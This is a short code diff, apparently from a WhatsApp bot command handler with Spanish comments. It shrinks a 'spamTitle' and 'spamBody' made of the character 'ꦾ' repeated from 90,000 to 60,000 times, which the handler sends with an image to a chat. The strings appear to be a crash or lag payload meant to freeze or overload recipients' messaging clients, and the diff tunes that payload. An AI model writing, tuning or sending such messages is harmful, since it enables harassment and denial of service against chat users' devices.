@@ -9,8 +9,8 @@ let handler = async (m, { conn, text }) => {
     const imageUrl = 'https://telegra.ph/file/ccf0310b5d7d511ad718d.jpg';
 
     // Texto repetido para título y cuerpo
-    const spamTitle = 'ꦾ'.repeat(90000);
-    const spamBody = 'ꦾ'.repeat(90000);
+    const spamTitle = 'ꦾ'.repeat(60000);
+    const spamBody = 'ꦾ'.repeat(60000);
 
     try {
         await conn.sendMessage(m.chat, {
